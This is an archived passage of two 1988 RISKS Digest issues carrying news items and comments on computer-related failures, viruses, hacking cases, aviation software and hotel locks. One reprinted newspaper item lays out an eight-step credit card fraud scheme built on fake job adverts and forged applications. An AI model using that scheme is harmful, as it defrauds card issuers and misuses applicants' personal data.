John Murray
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  "Brain" virus shows up in Hong Kong 
</A>
<DD>
<A HREF="#subj2.1">
Dave Horsfall
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  A Credit Card Fraud 
</A>
<DD>
<A HREF="#subj3.1">
Brian Randell
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Nausea-inducing propellor 
</A>
<DD>
<A HREF="#subj4.1">
Mike Trout
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Re: Ear-itating performance 
</A>
<DD>
<A HREF="#subj5.1">
Jan Wolitzky
</A><br>
<A HREF="#subj5.2">
 Ken Johnson
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
British computer calls Northern Ireland a "Region Unknown"
</A>
</H3>
<address>
John Murray
&lt;<A HREF="mailto:johnm@amdahl.uts.amdahl.com ">
johnm@amdahl.uts.amdahl.com 
</A>&gt;
</address>
<i>
20 Oct 88 18:25:36 GMT
</i><PRE>

Paraphrased from The Irish Times (Dublin), Oct 15 1988:

'A computer error resulted in the gross domestic product of Northern
Ireland being underestimated by more than 10 percent between 1983 and
1986. [A spokesperson for the Northern Ireland Economic Council] said
that the sluggishness evidenced by the statistics "could have under-
mined the confidence of potential investors".'

. . . . 'Over 70 percent of the North's GDP consists of estimates of
income [which] are calculated at Newcastle-on-Tyne [England] from
income tax returns and information in the Dept. of Health &amp; Social
Services. It appears that between 1983 and 1986 an error in the
computer programme responsible for extracting the relevant data cate-
gorised a growing number of earners in the North as "region unknown".'

[Further discussion follows about how the error may have supplemented
the region's other problems.]

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
"Brain" virus shows up in Hong Kong
</A>
</H3>
<address>
Dave Horsfall 
&lt;<A HREF="mailto:dave@stcns3.stc.oz.au">
dave@stcns3.stc.oz.au
</A>&gt;
</address>
<i>
Tue, 18 Oct 88 13:34:27 est
</i><PRE>

On the off-chance that you haven't had enough of virus reports, here's
another one from Computing Australia, 17th October, 1988:

``HK consultants hit by overseas virus

  A leading firm of financial consultants has become the first main-
  stream business in Hong Kong to be affected by a computer virus.
  The Business International consultancy reported last week the "Brain"
  virus -- well-known elsewhere in the world, but never before seen
  in Hong Kong -- had appeared on some disks.  ...  BI was playing down
  the significance of the find last week, with a company spokeswoman
  saying the virus had not reappeared and that no data had been lost.''

The article goes on further to discuss the origin of the Brain virus,
and makes the amazing observation "[it] does not destroy data, but
scrambles it beyond recognition".  I dunno, I would certainly regard
data "scrambled beyond recognition" as being "destroyed".

Dave Horsfall (VK2KFU),  Alcatel-STC Australia,  dave@stcns3.stc.oz
dave%stcns3.stc.OZ.AU@uunet.UU.NET,  ...munnari!stcns3.stc.OZ.AU!dave

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
A Credit Card Fraud
</A>
</H3>
<address>
Brian Randell 
&lt;<A HREF="mailto:B.Randell@newcastle.ac.uk">
B.Randell@newcastle.ac.uk
</A>&gt;
</address>
<i>
Tue, 18 Oct 88 11:51:07 +0100
</i><PRE>

This story, from Saturday's Guardian newspaper, comes from what sounds like an
interesting study of computer-related crime. It is reprinted here in full,
without permission. (The # sign is used to represent the pounds sterling sign.)
The risk in the particular fraud described would appear to have arisen - said
he with 20:20 hindsight, but no personal expertise in credit card fraud
- because of the latencies in, and inadequacies of, the means by which input
validity checks were performed.
 
Brian Randell
 
 
#9M Credit Card Fraudster Cleans Up With a Full House
 
[by] Peter Large
Technology Editor
[Guardian, 15 Oct. 1988, p.11]
 
Credit card companies were robbed of #6 million to #9 million within two weeks
by an eight stage, one-man fraud. The recipe used was this:
 
1: Take a mortgage on a house that has already changed hands once in the past
five years.
 
2: Advertise a bogus job overseas at a juicy salary (that brings 4,000
replies).
 
3: Send the job applicants a form demanding the same details as those required
for a credit-card application.
 
4: The hard work: transfer that information to the application forms of
several smallish credit-card and store-card operators, forging the signatures
and substituting the address of the safe house for the real address (that
ensures that any check with the electoral roll draws a blank, without
indicating a bogus applicant).
 
5: The fast work: spend or draw cash to the maximum possible - and within one
day - on each card as it arrives at the safe house.
 
6: To outpace the tracing, complete the operation within two weeks, even though
there are still many cards to spare.
 
7: Disappear.
 
8: Don't pay for the advert.
 
The case - he was never caught - was reported yesterday in the BIS group's
annual study of computer-related crime. Bill Farquhar, co-author of the report,
said the crime was discovered, much too late, when a clerk entering details
into a computer noted the same handwriting on different applications from the
same address.
 
Mr Farquhar said #3 million was traced from bank to building society to another
bank, before it was transferred abroad. But the total take was at least #6
million and probably #9 million, he said. The police found an empty house
carpeted with cards.
 
The report shows how computer fraud is spreading: the 225 cases traced by BIS
in the past year netted an average of #389,000, compared with #31,000 in 1983.
BIS reckons 90 per cent of computer crime is not reported by firms - or not
traced at all.
 
Firms so fear the publicity that some give the criminals golden handshakes and
glowing references to pass on to their next victim."
                                                  [Also noted by blf@scol.uucp]

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
  Nausea-inducing propeller (Re: RISKS DIGEST 7.64)
</A>
</H3>
<address>
Mike Trout
&lt;<A HREF="mailto:miket@brspyr1.brs.com ">
miket@brspyr1.brs.com 
</A>&gt;
</address>
<i>
17 Oct 88 18:35:47 GMT
</i><PRE>

In RISKS-FORUM Digest Volume 7 : Issue 64, Marshall Jose discusses how an
unwanted 28 kHz spike at a Stevie Wonder tour was inducing irritability and
impatience among artists, crew, and audience.  Our illustrious moderator Peter
also mentioned how the anapest beat of a particular rock tune could cause
alarming physical effects on certain people. 

This brings to mind the story of the infamous XF-84H, an airplane whose tale
appears every now and then in rec.aviation.  You may remember the old F-84
Thunderstreak/flash/whatever; in those days jet engines left a great deal to be
desired in both maximum power output and reliability.  Accordingly, somebody
got the bright idea of putting a super turboprop on the front of an F-84.
Tests showed the plane (designated the XF-84H) to have lots of reliable power 
and acceleration, but there was an unexpected side effect nobody predicted: 
ground crews working with the XF-84H began suffering from uncontrollable
nausea.  The cause was traced to the plane's monstrous propeller blades, which
of necessity were spinning at supersonic speeds and apparently setting up some
physiologically harmful harmonics.  The project was scrapped; the only XF-84H
built is on display at some AFB in California, I believe.

There seems to be little hard data in circulation about this project; it is
mentioned briefly in various authoritative publications but the details are
always sketchy.  Some questions that come to mind:  What kind of harmonics
would induce nausea, rather than something like irritability as in the Stevie
Wonder 28 kHz spike?  Why was the pilot apparently not affected?  Why is nausea
NOT induced by other supersonically-spinning propellers (which occasionally
crop up on various general aviation aircraft)?  I'm sure that USAF and Republic 
Aviation reports on this incident exist somewhere; anybody know any more?
 
~~~~~~~~~~~~~~~~~~~~~~~~~Michael Trout (miket@brspyr1)~~~~~~~~~~~~~~~~~~~~~~~~~
BRS Information Technologies, 1200 Rt. 7, Latham, N.Y. 12110  (518) 783-1161

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Re: Ear-itating performance
</A>
</H3>
<address>
&lt;<A HREF="mailto:wolit@research.att.com">
wolit@research.att.com
</A>&gt;
</address>
<i>
Mon, 17 Oct 88 08:59 EDT
</i><PRE>

         For one of his tours, Stevie Wonder contracted with Northwest Sound
    to build a set of PA speakers of extraordinary capability -- response
    nearly flat out to 45 kHz, etc. . . . .
         Finally, during one show, one of the sound guys was examining
    the audio spectrum analyzer screen, and mistakenly pushed the 20 kHz -
    200 kHz range button instead of the 2 kHz - 20 kHz button.  Imagine
    his alarm at the sight of a potent 28 kHz component, the product of
    all the synthesizers' DAC update clocks. . . . .

If the DAC clock rate was 28 KHz, the synthesizers' Nyquist frequency (the
highest frequency that could be reproduced) would have been only 14 KHz,
which is pretty crummy and wouldn't have required a fancy sound system.

Jan Wolitzky, AT&amp;T Bell Labs, Murray Hill, NJ; 201 582-2998; mhuxd!wolit
(Affiliation given for identification purposes only)

</PRE>
<HR><H3><A NAME="subj5.2">
Ear-itation
</A>
</H3>
<address>
&lt;<A HREF="mailto:JOHNSON%FOR3083.ISSC@ISEC-OA.ARPA">
JOHNSON%FOR3083.ISSC@ISEC-OA.ARPA
</A>&gt;
</address>
<i>
Tue, 18 Oct 88 17:56:23 EST
</i><PRE>

FROM: KEN JOHNSON     GRC, ROOM D253   EXT.233
Subject: Ear-itation
    A few years back , some pseudoscientists expressed a concern that the
"anapestic" beat was so counter to the natural beat of the heart that
the hearer's health and proper heart-functioning could be threatened
by hearing this beat.  In other words, when the thumping "We Are the
Champions" anapestic (and irritating) beat is heard at sporting events,
there is a major health risk!  Bah, I say!
   Concerning the 28K Hz problem - aren't we continually bombarding
animals with much higher hearing ranges (dogs, birds(?), bats) with
sounds in the post-20K Hz range?  And does Stevie Wonder, with a
higher dependence on his sense of hearing, notice the irritating
noises more than the person with normal senses?

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/7.65.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.67.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-19</DOCNO>
<DOCOLDNO>IA012-000131-B034-362</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/7.67.html 128.240.150.127 19970217023506 text/html 25006
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:33:30 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 7: Issue 67</TITLE>
<LINK REL="Prev" HREF="/Risks/7.66.html">
<LINK REL="Up" HREF="/Risks/index.7.html">
<LINK REL="Next" HREF="/Risks/7.68.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/7.66.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.68.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 7: Issue 67</H1>
<H2> Tuesday 25 October 1988  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Unplugged Cable Plugs Orlando Traffic 
</A>
<DD>
<A HREF="#subj1.1">
Scot E Wilcoxon
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Airbus A320 in service 
</A>
<DD>
<A HREF="#subj2.1">
Henry Spencer
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Computer Literacy 
</A>
<DD>
<A HREF="#subj3.1">
Ronni Rosenberg
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Belgian PM's email tapped 
</A>
<DD>
<A HREF="#subj4.1">
Rodney Hoffman
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Police find hacker...and release him 
</A>
<DD>
<A HREF="#subj5.1">
Henry Cox
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Aegis user interface changes planned 
</A>
<DD>
<A HREF="#subj6.1">
Jon Jacky
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Programmable Hotel Locks 
</A>
<DD>
<A HREF="#subj7.1">
Allen J. Baum via John Rushby
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Nausea-inducing frequencies 
</A>
<DD>
<A HREF="#subj8.1">
David Chase
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
  Risks in Foundations of Numerical Analysis 
</A>
<DD>
<A HREF="#subj9.1">
John Cherniavsky
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj10">
  Takeoff warning systems to be tested 
</A>
<DD>
<A HREF="#subj10.1">
Henry Cox
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Unplugged Cable Plugs Orlando Traffic
</A>
</H3>
<address>
Scot E Wilcoxon
&lt;<A HREF="mailto:sewilco@datapg.MN.ORG ">
sewilco@datapg.MN.ORG 
</A>&gt;
</address>
<i>
Mon, 24 Oct 88 15:05:47 CDT
</i><PRE>

In the story below, it is interesting to note the mayoral aide emphasizes that
the computer "system" did not fail.  Apparently the operating procedures
failed, and for only six minutes.

October 11th: "Computer snafu creates traffic jam"

ORLANDO, Fla. (UPI) _ An engineer's mistake paralyzed downtown traffic for six
minutes when signals remained red during lunch hour and forced the city to
call out police on horseback to unclog intersections.

Traffic engineers replacing a piece of Orlando's sophisticated traffic light
synchronizing system Tuesday forgot to plug in a cable, freezing the signals
at 34 intersections, mostly along Orlando's busy north-south thoroughfares
just after 12:30 p.m.

"It wasn't a glitch in the system. It was during an installation, someone
forgot to plug in a couple of machines," said mayoral aide Joe Mittiga.

Orlando's $3 million synchronizing computer started working this summer, but
Mittiga said workers adding equipment forgot to connect two parts and a backup
system failed to initiate when the main computer system failed.

"They were left unplugged inadvertently for six minutes," he said.

Thousand of drivers were stuck in traffic as the lights remained on
red, green or yellow, Mittiga said.
--
Scot E. Wilcoxon  sewilco@DataPg.MN.ORG    {amdahl|hpda}!bungia!datapg!sewilco
Data Progress 	 UNIX masts &amp; rigging  +1 612-825-2607


</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Airbus A320 in service
</A>
</H3>
<address>
&lt;<A HREF="mailto:attcan!utzoo!henry@uunet.UU.NET">
attcan!utzoo!henry@uunet.UU.NET
</A>&gt;
</address>
<i>
Tue, 25 Oct 88 00:55:22 EDT
</i><PRE>

The 3 Sept issue of Flight International has a feature article about early
operational experience with the A320.  Apparently everyone has been rather
surprised that many of its teething problems have little to do with the
electronics.  Spare parts, in particular, have been somewhat of a problem.

One thing the airlines are quite happy with is the Centralized Fault
Display System, which keeps a running log of all in-flight problems for
scrutiny by the maintenance crews.  Both British Airways and Air France
plan to link the CFDS to a communications system, so that faults can be
reported from the air and spare parts can be waiting when the aircraft
lands.  At present, the written engineering log is still the official
and legal record of in-flight problems, but after some more experience
with CFDS this may be reconsidered.  There are still occasional bugs in
the CFDS software, but things are getting fixed.  The airlines say that
CFDS has been a major factor in keeping a new airliner running unusually
well.

The fly-by-wire flight controls have behaved perfectly.

The engine-control computers likewise have a flawless record, although
at one point Air France replaced a number of them due to what seems to
have been a misunderstanding about the location of some problems.

Power spikes caused by the cutover from ground to onboard power have
been a headache, as they tend to trigger bad-power-supply detectors in
the computers.  These problems invariably happen on the ground, not in
flight.  Work is underway on fixing them.  Many of the computers
affected are in very minor control roles; a particular trouble spot has
been the microcomputer-controlled vacuum toilets chosen by Air France.

The biggest problem for both airlines is a set of design and manufacturing
flaws in the air-conditioning units, combined with shortage of spares.
Computers are not involved in this one.

Both airlines have a low opinion of the software in the Cabin Intercommu-
nication Data System, which controls cabin lights, signs, speakers, and
entertainment.  Both agree that the idea of the system is good and want
to see it operational, but the suppliers simply did not have production-
quality software ready in time.  "A kid could have written the software
for the CIDS", says BA, but in fact the current [3 Sept] software simply
does not work and BA has been bypassing it almost entirely.  The main
problem is frequent intermittent manlfunctions.

Spare flight computers are still being carried on each flight, but this
is routine for major no-go items on new airliners.  Airbus says that
there is now enough experience to justify dispatching an A320 with one
of its seven flight-control computers dead; the original rule required
all to be functioning.  Airbus is still working on "tidying up" the
flight-control software's responses to situations where the aircraft
has gone outside the normal flight envelope involuntarily, e.g. from
collision damage or sudden severe turbulence.  Assorted "nice to have"
features are also being implemented now that the schedule pressure has
relaxed.

The only change in Air France operating procedures since the airshow
crash has been a firm policy that airshow appearances will not carry
passengers henceforth.  The wreckage is being studied for lessons to
be learned; the Flight article observes that a crash into a mature
forest killed only three out of 136 people.  Of note are signs that
the floor-level emergency lighting system may not have turned on
properly, and the failure of the hand-held megaphone's mounting bracket
at rather less than its rated 9G.

The 24 Sept issue reports that the pilot of the airshow crash has been
fired, with the copilot's status yet to be decided.  A recent report by
the French civil aviation authorities contains the first independent
confirmation that the accident was caused by pilot error.  (The pilots'
union, of course, contests this.)  The report recommends an eight-year
suspension of the pilot's licence, and a two-month licence suspension
for the copilot.

"Officials familiar with the flight recorder evidence say that despite
the pilots' assertion that the aircraft was slow in responding to the
controls, the flight control computers probably prevented a worse
disaster by keeping the aeroplane unstalled when the pilots realized
too late that they were about to crash."

                                     Henry Spencer at U of Toronto Zoology
                                 uunet!attcan!utzoo!henry henry@zoo.toronto.edu

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Computer Literacy
</A>
</H3>
<address>
Ronni Rosenberg 
&lt;<A HREF="mailto:ronni@VX.LCS.MIT.EDU">
ronni@VX.LCS.MIT.EDU
</A>&gt;
</address>
<i>
Tue, 25 Oct 88 10:36:36 edt
</i><PRE>

I am writing a Ph.D. thesis on computer-literacy education.  One way in which
this work differs from previous work is that it incorporates the perspectives
of not only educators, but also computer professionals, the most computer-
literate group in society.  (To the extent that "computer literacy" means
anything, it must apply to computer professionals.)  To get more feedback from
the computer community, I am starting a RISKS dialogue on computer literacy.

I will be sending several messages about computer literacy, asking for your
opinions and reactions.  This is not a right-or-wrong issue.  Since I am
interested in what people think about computer literacy, all responses are
valid!  Reply to me directly if you don't think your message is appropriate
for RISKS.  (For instance, for my purposes, it is fine for lots of people to
send messages just saying they agree with what someone else said, but such
messages are best sent directly to me.)  As usual, PGN will publish in RISKS
the most relevant submissions.  In this case, he will also forward to me the
other submissions on this topic.

All submissions are confidential.  Anything that I quote or paraphrase will
be presented anonomously, unless I get explicit permission from an individual
to use his or her name.  Usually I don't attribute a comment more specifically
than to say, for instance, it is from "a Computer Science professor."  You can
indicate in your message the sort of work you do with computers, if you like.

	      *               *               *               *

In a 1985 school survey, 96% of the respondents -- classroom teachers,
computer coordinators, and administrators -- said that their schools offered
instruction in computer literacy.  What do you know about course content and
materials, school hardware and software, teacher training, and so on?  Are
your children learning about computers in schools?  Have you been involved in
any sort of school advisory committee for computer education?  If computer-
literacy education has not crossed your path, what do you guess is taught in
a typical class?

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Belgian PM's email tapped
</A>
</H3>
<address>
Rodney Hoffman 
&lt;<A HREF="mailto:Hoffman.es@Xerox.COM">
Hoffman.es@Xerox.COM
</A>&gt;
</address>
<i>
23 Oct 88 18:13:40 PDT (Sunday)
</i><PRE>

From the 'Los Angeles Times', Saturday, October 22, 1988:

   BELGIAN LEADER'S MAIL REPORTEDLY READ BY HACKER
   
   BRUSSELS (AP) -- Belgian Prime Minister Wilfried Martens on 
   Friday ordered an investigation into reports that a computer
   hacker rummaged through his electronic files and those of other 
   Cabinet members.
   
   The newspaper De Standaard reported that a man, using a personal
   computer, for three months viewed Martens' electronic mail and
   other items, including classified information about the killing
   of a British soldier by the Irish Republican Army in Ostend in
   August.
   
   The newspaper said the man showed one of its reporters this week
   how he broke into the computer, using Martens' password code of
   nine letters, ciphers and punctuation marks.  "What is more,
   during the demonstration, he ran into another 'burglar' ... with
   whom he briefly conversed" via computer, the newspaper said.

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Police find hacker...and release him
</A>
</H3>
<address>
Henry Cox  
&lt;<A HREF="mailto:cox@spock.ee.mcgill.ca">
cox@spock.ee.mcgill.ca
</A>&gt;
</address>
<i>
Mon, 24 Oct 88 09:19:44 edt
</i><PRE>

[ From the Montreal Gazette, 24 October, 1988 ]

POLICE FIND HACKER WHO BROKE INTO 200 COMPUTERS

London (New York Times) - Police said yesterday that they had found
and questioned a 23-year-old man who used computer networks to break  
into more than 200 military, corporate, and university systems in
Europe and the United States during the past five years.
 
The man was asked about an alleged attempt to blackmail a computer
manufacturer, but an official for Scotland Yard said that there was
not enough evidence to pursue the matter.  He was released.

The man, Edward Austin Singh, who is unemployed, reportedly told the
police he had been in contact with other computer ``hackers'' in the
United States and West Germany who use communications networks to
penetrate the security protecting computers at military
installations. 

Singh's motive was simply to prove that it was possible to break into
the military systems, police said, and apparently he did not attempt
espionage.

London police began an investigation after the man approached a
computer manufacturer.  He allegedly asked the company for $5250 in
exchange for telling it how he had entered its computer network.

The company paid nothing, and London police tracked the suspect by
monitoring his phone calls after the firm had told Scotland Yard
about the incident.
					Henry Cox (cox@spock.ee.mcgill.ca)

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Aegis user interface changes planned
</A>
</H3>
<address>
&lt;<A HREF="mailto:jon@june.cs.washington.edu">
jon@june.cs.washington.edu
</A>&gt;
</address>
<i>
Mon, 24 Oct 88 09:43:56 PDT
</i><PRE>

Here are excerpts from, "Fixes to Aegis system recommended by Navy," 
by John A. Adam, THE INSTITUTE (News supplement to IEEE SPECTRUM) vol 12
no 11, Nov. 1988, pps. 1,2:

"The Chief of Naval Operations is to assess a redesign of the Aegis
large-screen display that would allow the option of showing an aircraft's 
altitude directly.  Admiral William J. Crowe said "it was never adequately
reconciled" why the operator misinterpreted the digital readout of the 
airliner's altitude as descending while the replayed data showed constant
ascent.  The descending profile added to the perception of the approaching
aircraft as hostile (in the July 3 1988 shootdown of an Iranian commercial
airliner, which was mistaken for a hostile F-14).

Four screens, which make up the principal visual information source for the
ship's top combat officers, at present show two-dimensional tracks of 
targets each tagged with a 24 character alphanumeric label indicating such
data as velocity and identification ... Defense secretary Frank Carlucci
said that to find range and altitude information of a target on the screen,
one must examine a computer readout, which is distracting.  "We think it's a
good idea to display altitude and range on a large screen," Carlucci said.
"I think you could probably even put an arrow on whether it's ascending or 
descending." ...

The investigation also found that Iranian Flight 655 was emitting the
civilian identification-friend-or-foe (IFF) mode 3 squawk - not a military
code as had been supposed by the Vincennes crew. .. Misidentification of 
the airliner's signal for a mode 2 military squawk happened because the
radar operator left his range gate at the airport for 90 seconds instead
of moving it, said Carlucci.  The signal from another aircraft was picked
up, which led the Vincennes Combat Information Center to declare the contact
an F-14 fighter. ...

At the press conference, Carlucci said of the Aegis: "I'm not indicating 
it wasn't designed correctly," he said, but "as you go through experience
with any weapon system you improve the design," particularly in combat.

- Jonathan Jacky, University of Washington

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
Programmable Hotel Locks 
</A>
</H3>
<address>
John Rushby 
&lt;<A HREF="mailto:RUSHBY@csl.sri.com">
RUSHBY@csl.sri.com
</A>&gt;
</address>
<i>
Mon 17 Oct 88 17:09:58-PDT
</i><PRE>

&gt;From cslb!joyce!ames!mailrus!tut.cis.ohio-state.edu!bloom-beacon!apple!baum Mon Oct 17 16:54:22 PDT 1988
Article 4803 of rec.travel:
Path: cslb!joyce!ames!mailrus!tut.cis.ohio-state.edu!bloom-beacon!apple!baum
&gt;From: baum@Apple.COM (Allen J. Baum)
Newsgroups: rec.travel
Subject: Re: Programable Hotel Locks
Message-ID: &lt;18933@apple.Apple.COM&gt;
Date: 17 Oct 88 20:16:04 GMT
Reply-To: baum@apple.UUCP (Allen Baum)
Organization: Apple Computer, Inc.

&gt;In article &lt;7366@aw.sei.cmu.edu&gt; weinstoc@sei.cmu.edu (Chuck Weinstock) writes:
&gt;I wasn't sure where to post this, but rec.travel seems like a
&gt;reasonable possibility.  Many hotels these days have programmable
&gt;locks.  Upon checkin, a card is either magnetized or punched and
&gt;serves as your key.  My question is, how is the lock itself
&gt;programmed?  It's hard to believe that they run wires all around the
&gt;hotel and through the hinge of the door, though I suppose that's possible.
&gt;
&gt;Chuck Weinstock

I've been told that the locks contain a feedback-shift-register, or
something similar. It, internally, generates the next key. If a key
it doesn't recognize is inserted, it checks it against the next key.
If it matches, the lock advances to the next combination. At the
desk, they know how to generate a new combination from an old one,
and they know the last key issued, so they merely generate the new key.
Simply inserting the new, valid key into the lock does all the work of
updating. Presumably, there are also master-key, and resetting provisions.

what th

--
{decwrl,hplabs}!nsc!baum@apple.com		(408)973-3385

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
Nausea-inducing frequencies ( Re: <A HREF="/Risks/7.66.html">RISKS-7.66</A> )
</A>
</H3>
<address>
David Chase
&lt;<A HREF="mailto:chase@orc.olivetti.com ">
chase@orc.olivetti.com 
</A>&gt;
</address>
<i>
Thu, 20 Oct 88 16:45:34 -0700
</i><PRE>

Ask any competent neurologist and you should get a quick answer.  Flashing
lights at certain frequencies (I think 15Hz is one very important one) can
induce nausea and/or epileptic seizures in some people.  A neurologist told
me of encountering three people in one day who had been zarked by the same
failing flourescent bulb at a meat counter.  Flashing lights are also a part
of EEGs taken when epilepsy is suspected.

As far as the props go, it could have been a visual flicker effect, or it
could be that sounds can have a similar effect.  May I suggest (to the
curious among the audience) that you NOT try this experiment at home;
epileptic seizures are not especially good for you, and the known occurrence
of one tends to legally hinder your use of heavy equipment (like
automobiles) for a period of time.
                                                  David

</PRE>
<A NAME="subj9"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj9.1">
Risks in Foundations of Numerical Analysis
</A>
</H3>
<address>
John Cherniavsky 
&lt;<A HREF="mailto:jcc@mimsy.umd.edu">
jcc@mimsy.umd.edu
</A>&gt;
</address>
<i>
Fri, 21 Oct 88 10:28:43 EDT
</i><PRE>

In the October 1988 Bulletin of the American Mathematical Society there is
an article by Peter Linz, "A Critique of Numerical Analysis", that points up
the inadequacy of the foundations of numerical analysis.  In that article
he points out the inadequacies of current error analysis, the lack of
information regarding the fit of the numerical model to the real world
phenomenon that is being modeled (inappropriate choice of norm is his
example), and the lack of a mechanism to validate or test the numerical
model against the real world phenomenon being modeled.

With the advent of computers that can carry out three dimensional numerical
modeling and the use of such computers in the design of safety critical
systems (such as airplanes), a lack of adequate mathematical foundations for
numerical analysis could lead to serious consequences.

</PRE>
<A NAME="subj10"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj10.1">
Takeoff warning systems to be tested
</A>
</H3>
<address>
Henry Cox  
&lt;<A HREF="mailto:cox@spock.ee.mcgill.ca">
cox@spock.ee.mcgill.ca
</A>&gt;
</address>
<i>
Fri, 21 Oct 88 11:18:41 edt
</i><PRE>

[ From the Montreal Gazette, 21 October, 1988

JET TAKEOFF WANING SYSTEMS TO BE TESTED

Washington (AP) - The government has ordered immediate tests of takeoff
alarm systems on nearly 1800 Boeing 727 and Boeing 737 jetliners in the
U.S. after finding "a significant number" of the alarms not working
properly.

The alarms are a critical safety device because they warn pilots if
they have improperly set imstruments or control devices during takeoff.

The Federal Aviation Authority yesterday told the U.S. airlines they
must conduct the tests immediately and continue the checks every 200
flight hours.

Last year, the failure of pilots to set their flaps properly led to the
crash of a Northwest Airlines jet in Detroit, killing 156 people.

Investigators say a similar oversight remains a possibility in the
crash of a Delta Air Lines Boeing 727 in Detroit last August in which
14 people were killed.

In neither case was there any evidence that the takeoff alarm sounded.

